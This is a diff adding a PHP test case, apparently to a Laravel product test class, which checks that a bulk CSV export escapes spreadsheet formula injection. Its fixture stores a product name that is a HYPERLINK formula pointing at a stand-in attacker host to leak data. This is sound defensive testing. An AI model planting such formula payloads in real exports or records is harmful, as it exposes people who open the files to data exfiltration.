@@ -470,4 +470,24 @@ class ProductDuplicationAndBulkTest extends TestCase
 
         $response->assertSessionHasErrors('type');
     }
+
+    public function test_bulk_export_neutralises_formula_injection_in_product_data(): void
+    {
+        $product = $this->createProduct([
+            'sku' => 'INJ-001',
+            'name' => '=HYPERLINK("https://evil.test/?leak","ok")',
+        ]);
+
+        $response = $this->actingAs($this->admin)
+            ->post(route('products.bulk.export'), ['ids' => [$product->id]]);
+
+        $response->assertOk();
+        $csv = $response->streamedContent();
+
+        // The formula must be neutralised with a leading ' so a spreadsheet
+        // treats the cell as text. Without the fix the exported cell is a live
+        // =HYPERLINK formula that runs when the downloader opens the file.
+        $this->assertStringContainsString("'=HYPERLINK", $csv);
+        $this->assertStringContainsString('INJ-001', $csv);
+    }
 }
